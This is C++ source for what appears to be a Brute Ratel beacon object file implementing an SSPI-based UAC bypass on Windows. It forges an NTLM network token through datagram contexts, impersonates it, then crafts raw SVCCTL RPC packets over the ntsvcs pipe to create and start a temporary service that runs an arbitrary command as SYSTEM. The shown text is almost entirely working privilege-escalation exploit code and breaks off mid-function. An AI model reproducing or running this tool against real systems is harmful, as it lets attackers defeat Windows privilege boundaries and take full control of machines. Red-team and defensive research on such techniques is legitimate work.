// x86_64-w64-mingw32-g++ -c SspiUacBypassBOF.cpp -w -o SspiUacBypassBOF.o
#define SECURITY_WIN32

#include "definitions.h"
#include "badger_exports.h"

// rpc command ids
#define RPC_CMD_ID_OPEN_SC_MANAGER 27
#define RPC_CMD_ID_CREATE_SERVICE 24
#define RPC_CMD_ID_START_SERVICE 31
#define RPC_CMD_ID_DELETE_SERVICE 2

// rpc command output lengths
#define RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER 24
#define RPC_OUTPUT_LENGTH_CREATE_SERVICE 28
#define RPC_OUTPUT_LENGTH_START_SERVICE 4
#define RPC_OUTPUT_LENGTH_DELETE_SERVICE 4

#define MAX_RPC_PACKET_LENGTH 4096
#define MAX_PROCEDURE_DATA_LENGTH 2048

#define CALC_ALIGN_PADDING(VALUE_LENGTH, ALIGN_BYTES) (DWORD)((((VALUE_LENGTH + ALIGN_BYTES - 1) / ALIGN_BYTES) * ALIGN_BYTES) - VALUE_LENGTH)


typedef struct {
    WORD wContextID;
    WORD wTransItemCount;
    BYTE bInterfaceUUID[16];
    DWORD dwInterfaceVersion;
    BYTE bTransferSyntaxUUID[16];
    DWORD dwTransferSyntaxVersion;
} RpcBindRequestContextEntryStruct;

typedef struct {
    WORD wResult;
    WORD wAlign;
    BYTE bTransferSyntax[16];
    DWORD dwTransferSyntaxVersion;
} RpcBindResponseContextEntryStruct;

typedef struct {
    WORD wVersion;
    BYTE bPacketType;
    BYTE bPacketFlags;
    DWORD dwDataRepresentation;
    WORD wFragLength;
    WORD wAuthLength;
    DWORD dwCallIndex;
} RpcBaseHeaderStruct;

typedef struct  {
    DWORD dwAllocHint;
    WORD wContextID;
    WORD wProcedureNumber;
} RpcRequestHeaderStruct;

typedef struct {
    DWORD dwAllocHint;
    WORD wContextID;
    BYTE bCancelCount;
    BYTE bAlign[1];
} RpcResponseHeaderStruct;

typedef struct {
    WORD wMaxSendFrag;
    WORD wMaxRecvFrag;
    DWORD dwAssocGroup;
    BYTE bContextCount;
    BYTE bAlign[3];
    RpcBindRequestContextEntryStruct Context;
} RpcBindRequestHeaderStruct;

typedef struct {
    WORD wMaxSendFrag;
    WORD wMaxRecvFrag;
    DWORD dwAssocGroup;
} RpcBindResponseHeader1Struct;

typedef struct {
    DWORD dwContextResultCount;
    RpcBindResponseContextEntryStruct Context;
} RpcBindResponseHeader2Struct;

typedef struct {
    HANDLE hFile;
    DWORD dwCallIndex;
    DWORD dwInputError;
    DWORD dwRequestInitialised;
    BYTE bProcedureInputData[MAX_PROCEDURE_DATA_LENGTH];
    DWORD dwProcedureInputDataLength;
    BYTE bProcedureOutputData[MAX_PROCEDURE_DATA_LENGTH];
    DWORD dwProcedureOutputDataLength;
} RpcConnectionStruct;

DWORD RpcAppendRequestData_Binary(RpcConnectionStruct* pRpcConnection, BYTE* pData, DWORD dwDataLength);

DWORD RpcConvertUUID(char* pString, BYTE* pUUID, DWORD dwMaxLength) {
    BYTE bUUID[16];
    BYTE bFixedUUID[16];
    DWORD dwUUIDLength = 0;
    BYTE bCurrInputChar = 0;
    BYTE bConvertedByte = 0;
    DWORD dwProcessedByteCount = 0;
    BYTE bCurrOutputByte = 0;

    // ensure output buffer is large enough
    if (dwMaxLength < 16)
    {
        return 1;
    }

    // check uuid length
    dwUUIDLength = (DWORD) MSVCRT$strlen("00000000-0000-0000-0000-000000000000");
    if (MSVCRT$strlen(pString) != dwUUIDLength)
    {
        return 1;
    }

    // convert string to uuid
    for (DWORD i = 0; i < dwUUIDLength; i++)
    {
        // get current input character
        bCurrInputChar = *(BYTE*)((BYTE*)pString + i);

        // check if a dash character is expected here
        if (i == 8 || i == 13 || i == 18 || i == 23)
        {
            if (bCurrInputChar == '-')
            {
                continue;
            }
            else
            {
                return 1;
            }
        }
        else
        {
            // check current input character value
            if (bCurrInputChar >= 'a' && bCurrInputChar <= 'f')
            {
                bConvertedByte = 0xA + (bCurrInputChar - 'a');
            }
            else if (bCurrInputChar >= 'A' && bCurrInputChar <= 'F')
            {
                bConvertedByte = 0xA + (bCurrInputChar - 'A');
            }
            else if (bCurrInputChar >= '0' && bCurrInputChar <= '9')
            {
                bConvertedByte = 0 + (bCurrInputChar - '0');
            }
            else
            {
                // invalid character
                return 1;
            }

            if ((dwProcessedByteCount % 2) == 0)
            {
                bCurrOutputByte = bConvertedByte * 0x10;
            }
            else
            {
                bCurrOutputByte += bConvertedByte;

                // store current uuid byte
                bUUID[(dwProcessedByteCount - 1) / 2] = bCurrOutputByte;
            }
            dwProcessedByteCount++;
        }
    }

    // fix uuid endianness
    BadgerMemcpy((void*)bFixedUUID, (void*)bUUID, sizeof(bUUID));
    bFixedUUID[0] = bUUID[3];
    bFixedUUID[1] = bUUID[2];
    bFixedUUID[2] = bUUID[1];
    bFixedUUID[3] = bUUID[0];
    bFixedUUID[4] = bUUID[5];
    bFixedUUID[5] = bUUID[4];
    bFixedUUID[6] = bUUID[7];
    bFixedUUID[7] = bUUID[6];

    // store uuid
    BadgerMemcpy((void*)pUUID, (void*)bFixedUUID, sizeof(bUUID));

    return 0;
}

DWORD RpcBind(RpcConnectionStruct* pRpcConnection, char* pInterfaceUUID, DWORD dwInterfaceVersion) {
    RpcBaseHeaderStruct RpcBaseHeader;
    RpcBindRequestHeaderStruct RpcBindRequestHeader;
    DWORD dwBytesWritten = 0;
    DWORD dwBytesRead = 0;
    BYTE *bResponseData = (BYTE *)BadgerAlloc(MAX_RPC_PACKET_LENGTH); // did this to fix what seemed to be a stack overflow
    //BYTE bResponseData[MAX_RPC_PACKET_LENGTH];
    RpcBaseHeaderStruct* pRpcResponseBaseHeader = NULL;
    RpcBindResponseHeader1Struct* pRpcBindResponseHeader1 = NULL;
    RpcBindResponseHeader2Struct* pRpcBindResponseHeader2 = NULL;
    BYTE* pSecondaryAddrHeaderBlock = NULL;
    WORD wSecondaryAddrLen = 0;
    DWORD dwSecondaryAddrAlign = 0;

    // set base header details
    BadgerMemset((void*)&RpcBaseHeader, 0, sizeof(RpcBaseHeader));
    RpcBaseHeader.wVersion = 5;
    RpcBaseHeader.bPacketType = 11;
    RpcBaseHeader.bPacketFlags = 3;
    RpcBaseHeader.dwDataRepresentation = 0x10;
    RpcBaseHeader.wFragLength = sizeof(RpcBaseHeader) + sizeof(RpcBindRequestHeader);
    RpcBaseHeader.wAuthLength = 0;
    RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;

    // set bind request header details
    BadgerMemset((void*)&RpcBindRequestHeader, 0, sizeof(RpcBindRequestHeader));
    RpcBindRequestHeader.wMaxSendFrag = MAX_RPC_PACKET_LENGTH;
    RpcBindRequestHeader.wMaxRecvFrag = MAX_RPC_PACKET_LENGTH;
    RpcBindRequestHeader.dwAssocGroup = 0;
    RpcBindRequestHeader.bContextCount = 1;
    RpcBindRequestHeader.Context.wContextID = 0;
    RpcBindRequestHeader.Context.wTransItemCount = 1;
    RpcBindRequestHeader.Context.dwTransferSyntaxVersion = 2;

    // get interface UUID
    if (RpcConvertUUID(pInterfaceUUID, RpcBindRequestHeader.Context.bInterfaceUUID, sizeof(RpcBindRequestHeader.Context.bInterfaceUUID)) != 0)
    {
        return 1;
    }
    RpcBindRequestHeader.Context.dwInterfaceVersion = dwInterfaceVersion;

    // {8a885d04-1ceb-11c9-9fe8-08002b104860} (NDR)
    if (RpcConvertUUID("8a885d04-1ceb-11c9-9fe8-08002b104860", RpcBindRequestHeader.Context.bTransferSyntaxUUID, sizeof(RpcBindRequestHeader.Context.bTransferSyntaxUUID)) != 0)
    {
        return 1;
    }

    // write base header
    if (KERNEL32$WriteFile(pRpcConnection->hFile, (void*)&RpcBaseHeader, sizeof(RpcBaseHeader), &dwBytesWritten, NULL) == 0)
    {
        return 1;
    }

    // write bind request header
    if (KERNEL32$WriteFile(pRpcConnection->hFile, (void*)&RpcBindRequestHeader, sizeof(RpcBindRequestHeader), &dwBytesWritten, NULL) == 0)
    {
        return 1;
    }

    // increase call index
    pRpcConnection->dwCallIndex++;

    // get bind response
    BadgerMemset((void*)bResponseData, 0, MAX_RPC_PACKET_LENGTH);
    if (KERNEL32$ReadFile(pRpcConnection->hFile, (void*)bResponseData, MAX_RPC_PACKET_LENGTH, &dwBytesRead, NULL) == 0)
    {
        return 1;
    }

    // get a ptr to the base response header
    pRpcResponseBaseHeader = (RpcBaseHeaderStruct*)bResponseData;

    // validate base response header
    if (pRpcResponseBaseHeader->wVersion != 5)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->bPacketType != 12)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->bPacketFlags != 3)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->wFragLength != dwBytesRead)
    {
        return 1;
    }

    // get a ptr to the main bind response header body
    pRpcBindResponseHeader1 = (RpcBindResponseHeader1Struct*)((BYTE*)pRpcResponseBaseHeader + sizeof(RpcBaseHeaderStruct));

    // get secondary addr header ptr
    pSecondaryAddrHeaderBlock = (BYTE*)pRpcBindResponseHeader1 + sizeof(RpcBindResponseHeader1Struct);
    wSecondaryAddrLen = *(WORD*)pSecondaryAddrHeaderBlock;

    // validate secondary addr length
    if (wSecondaryAddrLen > 256)
    {
        return 1;
    }

    // calculate padding for secondary addr value if necessary
    dwSecondaryAddrAlign = CALC_ALIGN_PADDING((sizeof(WORD) + wSecondaryAddrLen), 4);

    // get a ptr to the main bind response header body (after the variable-length secondary addr field)
    pRpcBindResponseHeader2 = (RpcBindResponseHeader2Struct*)((BYTE*)pSecondaryAddrHeaderBlock + sizeof(WORD) + wSecondaryAddrLen + dwSecondaryAddrAlign);

    // validate context count
    if (pRpcBindResponseHeader2->dwContextResultCount != 1)
    {
        return 1;
    }

    // ensure the result value for context #1 was successful
    if (pRpcBindResponseHeader2->Context.wResult != 0)
    {
        return 1;
    }

    BadgerFree((PVOID*)&bResponseData);

    return 0;
}

DWORD RpcConnect(char* pPipeName, char* pInterfaceUUID, DWORD dwInterfaceVersion, RpcConnectionStruct* pRpcConnection) {
    HANDLE hFile = NULL;
    char szPipePath[512];
    //char ok[3000];
    //RpcConnectionStruct RpcConnection;
    RpcConnectionStruct *RpcConnection = (RpcConnectionStruct*)BadgerAlloc(sizeof(RpcConnectionStruct));

    // set pipe path
    BadgerMemset(szPipePath, 0, sizeof(szPipePath));
    MSVCRT$_snprintf(szPipePath, sizeof(szPipePath) - 1, "\\\\127.0.0.1\\pipe\\%s", pPipeName);

    // open rpc pipe
    hFile = KERNEL32$CreateFileA(szPipePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    // initialise rpc connection data
    BadgerMemset((void*)RpcConnection, 0, sizeof(RpcConnectionStruct));
    RpcConnection->hFile = hFile;
    RpcConnection->dwCallIndex = 1;

    // bind rpc connection
    if (RpcBind(RpcConnection, pInterfaceUUID, dwInterfaceVersion) != 0)
    {
        return 1;
    }

    // store connection data
    BadgerMemcpy((void*)pRpcConnection, (void*)RpcConnection, sizeof(RpcConnectionStruct));

    BadgerFree((PVOID*)&RpcConnection);

    return 0;
}

DWORD RpcSendRequest(RpcConnectionStruct* pRpcConnection, DWORD dwProcedureNumber) {
    RpcBaseHeaderStruct RpcBaseHeader;
    RpcRequestHeaderStruct RpcRequestHeader;
    DWORD dwBytesWritten = 0;
    //BYTE bResponseData[MAX_RPC_PACKET_LENGTH];
    BYTE *bResponseData = (BYTE *)BadgerAlloc(MAX_RPC_PACKET_LENGTH); // did this to fix what seemed to be a stack overflow
    RpcBaseHeaderStruct* pRpcResponseBaseHeader = NULL;
    RpcResponseHeaderStruct* pRpcResponseHeader = NULL;
    DWORD dwProcedureResponseDataLength = 0;
    DWORD dwBytesRead = 0;
    BYTE* pTempProcedureResponseDataPtr = NULL;

    // ensure rpc request has been initialised
    if (pRpcConnection->dwRequestInitialised == 0)
    {
        return 1;
    }

    // clear initialised flag
    pRpcConnection->dwRequestInitialised = 0;

    // check for input errors
    if (pRpcConnection->dwInputError != 0)
    {
        return 1;
    }

    // set base header details
    BadgerMemset((void*)&RpcBaseHeader, 0, sizeof(RpcBaseHeader));
    RpcBaseHeader.wVersion = 5;
    RpcBaseHeader.bPacketType = 0;
    RpcBaseHeader.bPacketFlags = 3;
    RpcBaseHeader.dwDataRepresentation = 0x10;
    RpcBaseHeader.wFragLength = (WORD) (sizeof(RpcBaseHeader) + sizeof(RpcRequestHeader) + pRpcConnection->dwProcedureInputDataLength);
    RpcBaseHeader.wAuthLength = 0;
    RpcBaseHeader.dwCallIndex = pRpcConnection->dwCallIndex;

    // set request header details
    BadgerMemset((void*)&RpcRequestHeader, 0, sizeof(RpcRequestHeader));
    RpcRequestHeader.dwAllocHint = 0;
    RpcRequestHeader.wContextID = 0;
    RpcRequestHeader.wProcedureNumber = (WORD)dwProcedureNumber;

    // write base header
    if (KERNEL32$WriteFile(pRpcConnection->hFile, (void*)&RpcBaseHeader, sizeof(RpcBaseHeader), &dwBytesWritten, NULL) == 0)
    {
        return 1;
    }

    // write request header
    if (KERNEL32$WriteFile(pRpcConnection->hFile, (void*)&RpcRequestHeader, sizeof(RpcRequestHeader), &dwBytesWritten, NULL) == 0)
    {
        return 1;
    }

    // write request body
    if (KERNEL32$WriteFile(pRpcConnection->hFile, (void*)pRpcConnection->bProcedureInputData, pRpcConnection->dwProcedureInputDataLength, &dwBytesWritten, NULL) == 0)
    {
        return 1;
    }

    // increase call index
    pRpcConnection->dwCallIndex++;

    // get bind response
    BadgerMemset((void*)bResponseData, 0, MAX_RPC_PACKET_LENGTH);
    if (KERNEL32$ReadFile(pRpcConnection->hFile, (void*)bResponseData, MAX_RPC_PACKET_LENGTH, &dwBytesRead, NULL) == 0)
    {
        return 1;
    }

    // get a ptr to the base response header
    pRpcResponseBaseHeader = (RpcBaseHeaderStruct*)bResponseData;

    // validate base response header
    if (pRpcResponseBaseHeader->wVersion != 5)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->bPacketType != 2)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->bPacketFlags != 3)
    {
        return 1;
    }
    if (pRpcResponseBaseHeader->wFragLength != dwBytesRead)
    {
        return 1;
    }

    // get a ptr to the main response header body
    pRpcResponseHeader = (RpcResponseHeaderStruct*)((BYTE*)pRpcResponseBaseHeader + sizeof(RpcBaseHeaderStruct));

    // context ID must be 0
    if (pRpcResponseHeader->wContextID != 0)
    {
        return 1;
    }

    // calculate command response data length
    dwProcedureResponseDataLength = (DWORD) (pRpcResponseBaseHeader->wFragLength - sizeof(RpcBaseHeaderStruct) - sizeof(RpcResponseHeaderStruct));

    // store response data
    if (dwProcedureResponseDataLength > sizeof(pRpcConnection->bProcedureOutputData))
    {
        return 1;
    }
    pTempProcedureResponseDataPtr = (BYTE*)pRpcResponseHeader + sizeof(RpcResponseHeaderStruct);
    BadgerMemcpy(pRpcConnection->bProcedureOutputData, pTempProcedureResponseDataPtr, dwProcedureResponseDataLength);

    // store response data length
    pRpcConnection->dwProcedureOutputDataLength = dwProcedureResponseDataLength;

    BadgerFree((PVOID*)&bResponseData);

    return 0;
}

DWORD RpcInitialiseRequestData(RpcConnectionStruct* pRpcConnection) {
    // initialise request data
    BadgerMemset(pRpcConnection->bProcedureInputData, 0, sizeof(pRpcConnection->bProcedureInputData));
    pRpcConnection->dwProcedureInputDataLength = 0;
    BadgerMemset(pRpcConnection->bProcedureOutputData, 0, sizeof(pRpcConnection->bProcedureOutputData));
    pRpcConnection->dwProcedureOutputDataLength = 0;

    // reset input error flag
    pRpcConnection->dwInputError = 0;

    // set initialised flag
    pRpcConnection->dwRequestInitialised = 1;

    return 0;
}

DWORD RpcAppendRequestData_Binary(RpcConnectionStruct* pRpcConnection, BYTE* pData, DWORD dwDataLength) {
    DWORD dwBytesAvailable = 0;

    // ensure the request has been initialised
    if (pRpcConnection->dwRequestInitialised == 0) {
        return 1;
    }

    // calculate number of bytes remaining in the input buffer
    dwBytesAvailable = sizeof(pRpcConnection->bProcedureInputData) - pRpcConnection->dwProcedureInputDataLength;
    if (dwDataLength > dwBytesAvailable) {
        // set input error flag
        pRpcConnection->dwInputError = 1;

        return 1;
    }

    // store data in buffer
    BadgerMemcpy((void*)&pRpcConnection->bProcedureInputData[pRpcConnection->dwProcedureInputDataLength], pData, dwDataLength);
    pRpcConnection->dwProcedureInputDataLength += dwDataLength;

    // align to 4 bytes if necessary
    pRpcConnection->dwProcedureInputDataLength += CALC_ALIGN_PADDING(dwDataLength, 4);

    return 0;
}

DWORD RpcAppendRequestData_Dword(RpcConnectionStruct* pRpcConnection, DWORD dwValue) {
    // add dword value
    return RpcAppendRequestData_Binary(pRpcConnection, (BYTE*)&dwValue, sizeof dwValue) != 0;
}

DWORD RpcDisconnect(RpcConnectionStruct* pRpcConnection) {
    // close pipe handle
    KERNEL32$CloseHandle(pRpcConnection->hFile);

    return 0;
}

int InvokeCreateSvcRpcMain(char* pExecCmd) {
    //RpcConnectionStruct RpcConnection;
    RpcConnectionStruct *RpcConnection = (RpcConnectionStruct*)BadgerAlloc(sizeof(RpcConnectionStruct));
    BYTE bServiceManagerObject[20];
    BYTE bServiceObject[20];
    DWORD dwReturnValue = 0;
    char szServiceName[256];
    DWORD dwServiceNameLength = 0;
    char szServiceCommandLine[256];
    DWORD dwServiceCommandLineLength = 0;

    BadgerDispatch(g_dispatch, "[*] Invoking CreateSvcRpc (by @x86matthew)\n");

    // generate a temporary service name
    BadgerMemset(szServiceName, 0, sizeof(szServiceName));
    MSVCRT$_snprintf(szServiceName, sizeof(szServiceName) - 1, "CreateSvcRpc_%u", KERNEL32$GetTickCount());
    dwServiceNameLength = (DWORD) MSVCRT$strlen(szServiceName) + 1;

    // set service command line
    BadgerMemset(szServiceCommandLine, 0, sizeof(szServiceCommandLine));
    MSVCRT$_snprintf(szServiceCommandLine, sizeof(szServiceCommandLine) - 1, "cmd /c start %s", pExecCmd);
    dwServiceCommandLineLength = (DWORD) MSVCRT$strlen(szServiceCommandLine) + 1;

    BadgerDispatch(g_dispatch, "[*] Connecting to \\\\127.0.0.1\\pipe\\ntsvcs RPC pipe \n");

    // open SVCCTL v2.0
    if (RpcConnect("ntsvcs", "367abb81-9844-35f1-ad32-98f038001003", 2, RpcConnection) != 0) {
        BadgerDispatch(g_dispatch, "[-] Failed to connect to RPC pipe\n");
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    BadgerDispatch(g_dispatch, "[*] Opening service manager...\n");

    // OpenSCManager
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, SC_MANAGER_ALL_ACCESS);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_OPEN_SC_MANAGER) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_OPEN_SC_MANAGER) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[20];

    // check return value
    if (dwReturnValue != 0) {
        BadgerDispatch(g_dispatch, "[-] OpenSCManager error: %u\n", dwReturnValue);

        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // store service manager object
    BadgerMemcpy(bServiceManagerObject, RpcConnection->bProcedureOutputData, sizeof(bServiceManagerObject));

    BadgerDispatch(g_dispatch, "[*] Creating temporary service...\n");

    // CreateService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceManagerObject, sizeof(bServiceManagerObject));
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceNameLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceName, dwServiceNameLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ALL_ACCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_WIN32_OWN_PROCESS);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_DEMAND_START);
    RpcAppendRequestData_Dword(RpcConnection, SERVICE_ERROR_IGNORE);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, dwServiceCommandLineLength);
    RpcAppendRequestData_Binary(RpcConnection, (BYTE*)szServiceCommandLine, dwServiceCommandLineLength);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_CREATE_SERVICE) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_CREATE_SERVICE) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[24];

    // check return value
    if (dwReturnValue != 0) {
        BadgerDispatch(g_dispatch, "[-] CreateService error: %u\n", dwReturnValue);

        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // store service object
    BadgerMemcpy(bServiceObject, &(RpcConnection->bProcedureOutputData[4]), sizeof(bServiceObject));

    BadgerDispatch(g_dispatch, "[*] Executing '%s' as SYSTEM user...\n", pExecCmd);

    // StartService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
    RpcAppendRequestData_Dword(RpcConnection, 0);
    RpcAppendRequestData_Dword(RpcConnection, 0);
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_START_SERVICE) != 0) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_START_SERVICE) {
        // error
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

    // check return value
    // if (dwReturnValue != 0 && dwReturnValue != ERROR_SERVICE_REQUEST_TIMEOUT) {
    //    BadgerDispatch(g_dispatch, "[-] StartService error: %d\n", dwReturnValue);
    //}

    BadgerDispatch(g_dispatch, "[*] Deleting temporary service...\n");

    // DeleteService
    RpcInitialiseRequestData(RpcConnection);
    RpcAppendRequestData_Binary(RpcConnection, bServiceObject, sizeof(bServiceObject));
    if (RpcSendRequest(RpcConnection, RPC_CMD_ID_DELETE_SERVICE) != 0) {
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // validate rpc output data length
    if (RpcConnection->dwProcedureOutputDataLength != RPC_OUTPUT_LENGTH_DELETE_SERVICE) {
        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    // get return value
    dwReturnValue = (DWORD)RpcConnection->bProcedureOutputData[0];

    // check return value
    if (dwReturnValue != 0) {
        BadgerDispatch(g_dispatch, "[-] DeleteService error: %u\n", dwReturnValue);

        RpcDisconnect(RpcConnection);
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }

    BadgerDispatch(g_dispatch, "[*] Finished\n");

    // disconnect from rpc pipe
    if (RpcDisconnect(RpcConnection) != 0) {
        BadgerFree((PVOID*)&RpcConnection);;
        return 1;
    }
    
    BadgerFree((PVOID*)&RpcConnection);;

    return 0;
}

// OG SspUACBypass code
#define SEC_SUCCESS(Status) ((Status) >= 0)
#define MAX_MESSAGE_SIZE 12000

HANDLE ForgeNetworkAuthToken();
void CheckTokenSession(HANDLE hToken);
BOOL IsThreadTokenIdentification();

void printHelp(){
	BadgerDispatch(g_dispatch, "[*] Usage: sspi_uac_bypass.o <filepath>\n");
	BadgerDispatch(g_dispatch, "[*] <filepath>    full path to the executable that will be launched with elevated privileges\n");
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    char *fileToRun = NULL;
    g_dispatch = dispatch;

    // Help check
	for (int i = 0; i < argc; i++) {
		if(BadgerStrcmp(argv[i], "-h") == 0){
			printHelp();
			return;
		}
	}

	if(argc < 1){
		printHelp();
        return;
	}

    fileToRun = argv[0];
    BadgerDispatch(g_dispatch, "[*] File to run: '%s'\n", fileToRun);
    
    HANDLE hNetworkToken = INVALID_HANDLE_VALUE;

    BadgerDispatch(g_dispatch, "[*] Forging a token from a fake Network Authentication through Datagram Contexts\n");
    hNetworkToken = ForgeNetworkAuthToken();
    if (hNetworkToken == INVALID_HANDLE_VALUE) {
        BadgerDispatch(g_dispatch, "[-] Cannot forge the network auth token, exiting...\n");
        return;
    }

    BadgerDispatch(g_dispatch, "[+] Network Authentication token forged correctly, handle --> 0x%x\n", hNetworkToken);
    
    CheckTokenSession(hNetworkToken);
    ADVAPI32$ImpersonateLoggedOnUser(hNetworkToken);
    
    // Some Windows versions check if the current process token session ID matches the forged token session ID
    // Older Windows versions don't, so trying anyway to impersonate even if the forged token session ID is 0
    if (IsThreadTokenIdentification()) {
        BadgerDispatch(g_dispatch, "[!] Impersonating the forged token returned an Identification token. Bypass failed :( \n");
    }
    else {
        BadgerDispatch(g_dispatch, "[+] Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now\n");
        InvokeCreateSvcRpcMain(fileToRun);
    }

    ADVAPI32$RevertToSelf();
    KERNEL32$CloseHandle(hNetworkToken);
    return;
}

HANDLE ForgeNetworkAuthToken() {
    CredHandle hCredClient, hCredServer;
    TimeStamp lifetimeClient, lifetimeServer;
    SecBufferDesc negotiateDesc, challengeDesc, authenticateDesc;
    SecBuffer negotiateBuffer, challengeBuffer, authenticateBuffer;
    CtxtHandle clientContextHandle, serverContextHandle;
    ULONG clientContextAttributes, serverContextAttributes;
    SECURITY_STATUS secStatus;
    HANDLE hTokenNetwork = INVALID_HANDLE_VALUE;
    SEC_CHAR* NTLMSP_NAME2 = "NTLM";

    secStatus = (SECURITY_STATUS) SECUR32$AcquireCredentialsHandleA(NULL, NTLMSP_NAME2, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredClient, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] AcquireCredentialsHandle Client failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }

    secStatus = (SECURITY_STATUS) SECUR32$AcquireCredentialsHandleA(NULL, NTLMSP_NAME2, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hCredServer, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] AcquireCredentialsHandle Server failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }

    negotiateDesc.ulVersion = 0;
    negotiateDesc.cBuffers = 1;
    negotiateDesc.pBuffers = &negotiateBuffer;
    negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    negotiateBuffer.BufferType = SECBUFFER_TOKEN;
    negotiateBuffer.pvBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
    secStatus = (SECURITY_STATUS) SECUR32$InitializeSecurityContextA(&hCredClient, NULL, NULL, ISC_REQ_DATAGRAM, 0, SECURITY_NATIVE_DREP, NULL, 0, &clientContextHandle, &negotiateDesc, &clientContextAttributes, &lifetimeClient);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] InitializeSecurityContext Type 1 failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }

    challengeDesc.ulVersion = 0;
    challengeDesc.cBuffers = 1;
    challengeDesc.pBuffers = &challengeBuffer;
    challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    challengeBuffer.BufferType = SECBUFFER_TOKEN;
    challengeBuffer.pvBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
    secStatus = (SECURITY_STATUS) SECUR32$AcceptSecurityContext(&hCredServer, NULL, &negotiateDesc, ASC_REQ_DATAGRAM, SECURITY_NATIVE_DREP, &serverContextHandle, &challengeDesc, &serverContextAttributes, &lifetimeServer);
    if (!SEC_SUCCESS(secStatus)) {
        BadgerDispatch(g_dispatch, "[-] AcceptSecurityContext Type 2 failed with secstatus code 0x%x \n", secStatus);
        return NULL;
    }

    authenticateDesc.ulVersion = 0;
    authenticateDesc.cBuffers = 1;
    authenticateDesc.pBuffers = &authenticateBuffer;
    authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
    authenticateBuffer.BufferType = SECBUFFER_TOKEN;
    authenticateBuffer.pvBuffer = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
